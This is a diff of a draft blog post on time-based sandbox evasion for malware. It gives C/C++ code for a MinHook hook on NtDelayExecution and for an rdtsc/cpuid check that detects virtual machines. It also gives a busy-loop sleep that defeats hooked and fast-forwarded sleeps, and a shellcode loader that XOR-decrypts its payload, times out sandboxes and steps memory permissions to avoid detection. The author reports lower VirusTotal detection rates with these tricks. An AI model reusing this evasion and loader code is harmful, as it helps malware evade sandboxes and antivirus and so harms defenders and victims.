@@ -1,6 +1,6 @@
 ---
-title: "Detecting and evading "
-date: 2022-11-20T14:28:34+01:00
+title: "Detecting and Evading Sandboxing through Time based evasion"
+date: 2022-12-7T14:28:34+01:00
 draft: true
 toc: false
 images:
@@ -9,18 +9,16 @@ tags:
 ---
 
 
-## Sleep isn't for the weak
+## Evasion O'Clock 
 Time based evasion techniques **\[T1497\]** are a relatively painless and efficient way of avoiding sandboxes.
 
 {{< image src="/img/01/sleepy.png" alt="Sleeping through sandboxes" position="center" style="border-radius: 8px;" >}}
 
-Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it's a guarantee malware will do it's best at staying under the radar, achieving this by either blending in or timing out the sandbox.
+Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it's a guarantee malware will do its best at staying under the radar, achieving this by either blending in, timing out the sandbox or simply detecting it's in one (in which case it won't do anything nefarious).
 
-One way of timing out the sandbox is simply making your malware sleep through it, exhausting the sandbox which makes it time out and assume the sample is benign.
+For instance, one way of timing out the sandbox  is simply making your malware sleep through it, exhausting the sandbox which makes it time out and assume the sample is benign.
 
 However it's not *that* easy. Some modern detection solutions possess countermeasures against that, for example hooking sleep functions like `Sleep` in C/C++ or `Thread.Sleep` in C# to nullify the sleep, but also fast forwarding. TL;DR: Tampering to make the malware think it is in the clear.
-
-A plethora of techniques can be applied to still "sleep", we will see some of them in this blogpost.
 
 ## Demonstration: Hooking sleep functions
 
@@ -30,7 +28,7 @@ A plethora of techniques can be applied to still "sleep", we will see some of th
 > We kinda have a hierarchy such as  `Sleep` -> `SleepEx` -> `NtDelayExecution`
 
 For instance, we can try to hook this syscall to make the delay argument `0` basically nullifying the sleep.
-{{< image src="/img/01/diagram.png" alt="Sleeping through sandboxes" position="center" style="border-radius: 8px;" >}}
+{{< image src="/img/01/diagram.png" alt="Scuffed Diagram" position="center" style="border-radius: 8px;" >}}
 
 We can achieve this by using [MinHook](https://www.codeproject.com/Articles/21414/Powerful-x86-x64-Mini-Hook-Engine) which is a really awesome API hooking library.
 ```cpp
@@ -93,9 +91,9 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
 }
 ```
 
-Once injected in a program using any function that ends up calling `NtDelayExecution` (without it having it unhooked) it basically pops open a message box and nullifies the sleep by calling the original `NtDelayExecution` but with a `Delay` of 0.
+Once injected in a process using any function that ends up calling `NtDelayExecution` (without it having it unhooked) it pops open a message box and nullifies the sleep by calling the original `NtDelayExecution` but with a `Delay` of 0.
 
-Then again this is just theorical and to show how it would be possible to hook default sleep functions to nullify them, making malware unable to sleep through sandboxes with those functions at least.
+Then again this is just theorical and to show how it would be possible to hook default sleep functions to nullify them, making malware unable to sleep through sandboxes with those functions. As long as said malware doesn't unhook it whatsoever.
 
 We can for instance use it against an executable calling sleep two times such as
 ```cpp
@@ -112,10 +110,59 @@ int main()
 }
 ```
 
-![[messagebox.png]]
+{{< image src="/img/01/messagebox.png" alt="IT WORKS :)" position="center" style="border-radius: 8px;" >}}
+
 And as we see, once injected in the target proc, when it does call `Sleep` we get a message box :)
 
-## Sleeping via deadcode
+## Leveraging CPU cycles
+
+So this isn't an alternative sleeping method but it still counts as a time based evasion mechanism (i also think it's kinda cool :] )
+
+Due to the nature of virtualized environments having additional overhead, the amount of CPU cycles burnt by them will be way higher
+
+We can benchmark the CPU and get the amount of cycles since last reset.
+
+```cpp
+#include <Windows.h>
+#include <iostream>
+
+
+// Credits to VMRAY for their talk on antisandboxing
+// Nicer way to do it than just comparing the amount of CPU cycles burnt
+// by CloseHandle and GetProcessHeap for instance.
+int main()
+{
+	long long tsc, acc = 0; // setup tsc and accumulator var
+	int avg = 0; 
+	int out[4]; // buffer for cpuidex to write into
+	
+
+	// loop a 100 times for precision idk (tweak to your needs)
+	for (int i = 0; i < 100; ++i) { 
+		tsc = __rdtsc(); // get the amount of cpu cycles
+		__cpuidex( out, 0, 0 ); // burn some cpu cycles
+		acc += __rdtsc() - tsc; // smack in the accumulator the current cpu timestamp - the previous one 
+	}
+
+	avg = acc / 100; // divide per 100 to get the average
+	std::cout << "Burnt cycles between resets average: " << avg;
+	
+}
+```
+
+Testing this on both bare metal and virtualized environments we confirm that it's possible to leverage the overhead between a virtualized machine versus a bare metal one.
+
+{{< image src="/img/01/cpucycles.png" alt="How many CPU cycles burnt VM vs Bare metal" position="center" style="border-radius: 8px;" >}}
+
+And as we see (top -> VM, bottom -> bare metal), the virtualized environment burns way more cycles, confirming our hypothesis
+
+We can leverage this to detect the presence of a sandbox.
+
+```cpp
+if (acc > 300) { // not a fixed value, u2u to tune it but its around 250 on an actual machine
+	sandbox = TRUE;
+}
+```
 
 ## Weaponizing `__get_timestamp()`
 Credits to Jordan Jay (Legacyy) for his amazing work on this.
@@ -143,6 +190,8 @@ void __alt_sleepms( size_t ms )
 	volatile size_t x = rand(); // random buffer var 
 	const unsigned long long end = __get_timestamp() + ms; // calculate when we shall stop sleeping
 	while (__get_timestamp() < end) { x += 1; } // increment random var by 1 till we reach our endtime
+	if (__get_timestamp() - end > 2000) return; // Fast Forward check, might need some tuning
+	
 }
 ```
 And to be even more sneaky, we'll use a random time interval at each with sleep. 
@@ -164,7 +213,7 @@ __alt_sleepms( SLEEPTIME );
 
 Then we can leverage it in two ways in this basic loader.
 1. Timing out the sandbox by sleeping for a long time before decrypting our shellcode
-2. Sleeping in between changing the permissions of the memory we allocated for our shellcode such as RW -> R -> RX to try to blend in.
+2. Sleeping in between changing the permissions of the memory we allocated for our shellcode such as RW -> R -> RX to be less alarming (RWX is extremely loud).
 ```cpp
 #include <Windows.h>
 #include "buf.h" // Header file containing our shellcode as "unsigned char buf[]"
@@ -178,8 +227,11 @@ Then we can leverage it in two ways in this basic loader.
 int main()
 {
     // seed our generator 
+    // defaultseed could be any seed you choose
+    //but for obvious reasons i recommend using the __TIME__ macro for that.
     srand( defaultseed ); 
 
+	// initial timeout ? (could be extremely sus)
 	__alt_sleepms( SLEEPTIME * 12 );
 	
     // decrypt our xor encrypted shellcode
@@ -194,6 +246,7 @@ int main()
 
     // Now the interesting part where we can leverage sleeping
     // We basically change memory perms like RW -> R -> RX 
+    // RWX memory can appear as an IOC
     DWORD oldProtect;
     VirtualProtect( addr, sizeof( buf ), PAGE_READONLY, &oldProtect );
     
@@ -214,6 +267,18 @@ int main()
 
 ```
 
+Trying those techniques on virustotal will be left as an exercise to the reader, but if you are really curious the detection rate when using `__alt_sleepms()` instead of `Sleep` , at the time of writing, were lower (14/72 vs 25/72).
+
+# Moar stuff??
+
+Maybe, im busy with some projects of mine, only time will tell.
+
+# TL;DR
+Hooks on any default sleep function or the underlying syscall (`NtDelayExecution`) can be avoided without using unhooking.
+
+This was just a showcase on two time based evasion techniques i thought of as cool, i might add some more if i can be bothered.
+
+Thank you for your time :)
 
 
 # Credits/Sources
